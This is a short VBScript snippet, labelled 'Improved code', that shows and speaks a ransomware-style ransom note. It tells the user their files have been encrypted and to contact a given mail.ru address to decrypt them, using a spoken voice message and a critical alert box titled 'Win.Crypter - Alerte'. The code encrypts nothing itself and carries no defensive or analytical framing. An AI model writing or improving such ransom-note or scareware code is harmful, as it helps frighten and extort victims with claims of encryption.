' Improved code
Dim message
message = "Warning: Your files have been encrypted, To decrypt them, contact win.crypter@mail.ru"
Set sapi = CreateObject("SAPI.SpVoice")
sapi.Speak message
MsgBox message, vbCritical, "Win.Crypter - Alerte"